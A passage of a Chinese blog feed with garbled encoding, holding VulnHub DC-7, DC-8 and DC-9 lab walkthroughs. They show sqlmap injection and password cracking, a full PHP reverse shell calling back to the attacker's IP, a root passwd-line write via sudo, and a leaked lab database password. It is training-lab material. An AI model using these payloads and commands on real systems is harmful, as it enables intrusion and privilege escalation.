src="https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png"></p><p>ç”Ÿæˆä¸€ä¸ªå¯†ç hash,è´¦å·ä¸ºdomon å¯†ç  123456</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt demon 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png"></p><p>å°†ç”Ÿæˆçš„å¯†ç hashå†™å…¥ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash&#x27;</span> &gt;&gt; /tmp/demon</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png"></p><p>å†åˆ©ç”¨testå‘½ä»¤å†™å…¥&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test ./demon /etc/passwd</span><br></pre></td></tr></table></figure><p>ç™»å½•demon,æ‹¿åˆ°flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/dc-9,412/&quot;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.150&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="apache" scheme="https://syst1m.top/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc8æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-16T11:48:19.000Z</published>
    <updated>2022-06-17T11:05:09.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>é¶æœº:172.16.17.149<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æé¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png"></p><p>è®¿é—®é¦–é¡µçš„æ—¶å€™å‘ç°ä¸€å¤„urlå¸¦idå­—æ ·,æ‰“ä¸Šä¸€ä¸ªå•å¼•å·,å‘ç°æŠ¥é”™<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png"></p><p>å°è¯•æ³¨å…¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>##sqlæ³¨å…¥<br>ä¸¢åˆ°sqlmapè·‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png"></p><p>è·‘å‡ºè´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sqlmap -u http://172.16.17.149/?nid=3 -D d7db -T <span class="built_in">users</span> --dump -C <span class="string">&quot;name,pass&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png"></p><p>ä½†æ˜¯md5è§£ä¸å‡º,çœ‹åˆ°è´¦å·é‡Œæœ‰ä¸€ä¸ªjohn,æç¤ºæˆ‘ä»¬ä½¿ç”¨johnå·¥å…·<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png"></p><p>è·‘å‡ºä¸€ä¸ªå¯†ç turtle</p><p>ä»robots.txtçŸ¥é“åå°åœ°å€<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png"></p><p>å°è¯•ç™»å½•,johnç”¨æˆ·ç™»å½•æˆåŠŸ</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ä¸€ç›´ç¿»ç¿»ç¿»,åœ¨ä¸‹é¢è¿™ä¸ªurlç¿»åˆ°ä¸€ä¸ªåŠŸèƒ½ç‚¹,å¯ä»¥æ‰§è¡Œphpä»£ç <br><a href="http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure">http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure</a></p><p>å†™åå¼¹shellè¯­å¥,éœ€è¦æ³¨æ„,è¦å†ä»£ç å‰é¢æ·»åŠ ä¸€äº›å­—ç¬¦ä¸²,ä¸ç„¶ä¸ä¼šè¢«æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png"></p><p>webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">9999</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png"></p><p>kaliéœ€è¦æå‰ç›‘å¬,ç­‰å¾…åå¼¹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å®¶ç›®å½•æ²¡æœ‰ä¸œè¥¿,sudo -léœ€è¦å¯†ç ,ä½†æ˜¯å‘ç°ä¸€ä¸ªexim4å‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png"></p><p>æŸ¥çœ‹exim4 ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep exim</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png"></p><p>ç”¨msfæœç´¢åˆ©ç”¨,å‘ç°éœ€è¦ä¸€ä¸ªä¼šè¯<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png"></p><p>åˆ©ç”¨æ‹¿åˆ°çš„shell,åå¼¹ä¸€ä¸ªä¼šè¯ç»™msf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png"></p><p>åˆ©ç”¨å¤±è´¥,å†æ‰¾åˆ«çš„expæ‰“,æ‰¾ææƒçš„<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png"></p><p>å°†å‡ ä¸ªexpæ‹·è´å‡ºæ¥,kaliç”¨pythonèµ·ä¸€ä¸ªhttpæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png"></p><p>é¶æœºä¸‹è½½,æ³¨æ„è¦åˆ°tmpç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png"></p><p>ä½¿ç”¨exp,åœ¨&#x2F;rootä¸‹æ‰¾åˆ°flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-8,367/&quot;&gt;https://www.vulnhub.com/entry/dc-8,367/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.149&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc7æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T11:44:43.000Z</published>
    <updated>2022-06-16T11:42:10.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>é¶æœº:172.16.17.148<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æé¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151951342.png"></p><p>è®¿é—®é¦–é¡µ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151950632.png"></p><p>cmsä¸ºDrupal8,æœä¸€ä¸‹cmsæ¼æ´,å°è¯•å‡ ä¸ªexpä½†ä¸å­˜åœ¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152016201.png"></p><p>æ‰«æä¸€ä¸‹ç›®å½•,éƒ½æ˜¯403,æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152017923.png"></p><p>ç›®å…‰æ¥åˆ°é¦–é¡µ,å‘ç°ä¸€ä¸ªid<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152019276.png"></p><p>googleåœ¨githubä¸Šæ‰¾åˆ°æºç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152020088.png"></p><p>åœ¨é…ç½®æ–‡ä»¶ç¿»åˆ°æ•°æ®åº“è´¦å·å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152023471.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>æ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç ,ä½†æ˜¯nmapæ‰«æçš„æ—¶å€™,mysqlå¹¶æ²¡æœ‰å¼€å¯å¤–é“¾</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$user</span>name = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="symbol">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="æ’åº“"><a href="#æ’åº“" class="headerlink" title="æ’åº“"></a>æ’åº“</h2><p>æ‹¿ç€è´¦å·å¯†ç æ’ä¸€ä¸‹ç™»å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152029676.png"></p><p>å†è¯•ä¸€ä¸‹ssh,æˆåŠŸç™»å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152031261.png"></p><h2 